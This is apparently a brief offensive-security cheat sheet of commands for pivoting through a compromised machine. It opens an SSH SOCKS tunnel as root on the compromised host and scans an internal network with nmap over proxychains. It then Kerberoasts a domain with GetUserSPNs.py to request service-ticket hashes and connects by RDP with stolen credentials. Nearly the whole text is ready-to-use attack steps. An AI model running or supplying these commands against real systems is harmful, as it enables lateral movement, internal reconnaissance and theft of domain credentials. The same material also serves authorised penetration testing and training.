### cat /etc/proxychains4.conf
 
at the bottom, look for socks 4 address so you can bind to it
 
### ssh -f -N -D <socks_port> -i pivot root@<compromised_host_ip>
 
now you can proxy traffic through the first machine
 
### proxychains nmap -sT <new_network_ip>
 
### proxychains python3 GetUserSPNs.py <domain.local>/<user>:<password> -dc-ip <dc_ip> -request
 
### proxychains xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:USERNAME /p:'PASSWORD'
 
### proxychains firefox